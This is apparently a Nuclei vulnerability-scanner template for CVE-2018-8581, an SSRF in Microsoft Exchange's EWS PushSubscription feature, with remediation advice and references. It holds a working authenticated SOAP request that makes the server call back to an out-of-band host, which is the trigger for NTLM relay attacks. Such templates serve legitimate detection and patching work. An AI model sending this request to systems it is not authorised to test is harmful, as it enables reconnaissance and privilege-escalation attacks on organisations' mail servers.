http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - SSRF via EWS PushSubscription
  author: wijelex712
  severity: high
  description: |
    Microsoft Exchange Server 2010, 2013, 2016, and 2019 contain a Server-Side Request Forgery (SSRF) vulnerability 
    in the Exchange Web Services (EWS) PushSubscription feature. An authenticated attacker can exploit this to force 
    the Exchange server to authenticate to an arbitrary server, enabling NTLM relay attacks that can lead to privilege 
    escalation, potentially to domain administrator level. The vulnerability is exploitable by any authenticated user 
    with a mailbox on the Exchange server.
  impact: |
    Successful exploitation allows an authenticated attacker to:
    - Force Exchange server to authenticate to attacker-controlled servers
    - Relay NTLM authentication to escalate privileges
    - Potentially gain domain administrator access
    - Impersonate other Exchange users
  remediation: |
    1. Apply Microsoft security updates for Exchange Server addressing CVE-2018-8581
    2. Enable Extended Protection for Authentication on Exchange IIS endpoints
    3. Enable LDAP signing and channel binding on Domain Controllers
    4. Enable SMB signing on Domain Controllers
    5. Consider disabling EWS PushSubscription if not required
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://www.cyber.gc.ca/en/alerts/microsoft-exchange-privilege-escalation
    - https://github.com/Ridter/Exchange2domain
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
    epss-score: 0.90830
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query: product:"Microsoft Exchange Server"
    verified: true
  tags: cve,cve2018,microsoft,exchange,ssrf,ntlm,kev,authenticated

variables:
  username: "{{username}}"
  password: "{{password}}"

http:
  - raw:
      - |
        GET /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Content-Type: text/xml; charset=utf-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2010" />
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox" />
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                  <t:EventType>ModifiedEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        name: exchange-detected
        dsl:
          - 'status_code_1 == 401 || status_code_1 == 302'
          - 'contains(tolower(header_1), "x-owa-version") || contains(tolower(header_1), "x-exchangeserver")'
        condition: and

      - type: dsl
        name: ssrf-confirmed
        dsl:
          - 'contains(body_2, "SubscribeResponse")'
          - 'contains(body_2, "NoError") || contains(body_2, "Success")'
          - 'contains(interactsh_protocol, "http")'
        condition: and

    extractors:
      - type: regex
        name: exchange-version
        part: header_1
        group: 1
        regex:
          - '(?i)X-OWA-Version:\s*([^\r\n]+)'
          - '(?i)X-ExchangeServer:\s*([^\r\n]+)'

      - type: dsl
        dsl:
          - '"Exchange Server detected at: " + BaseURL'
          - '"SSRF vulnerability confirmed via EWS PushSubscription"'
          - '"Interactsh callback received from: " + interactsh_protocol'

# digest: 4a0a00473045022100b8f3e2d1c4a5b6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1022047a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1:922c64590222798bb761d5b6d8e72950
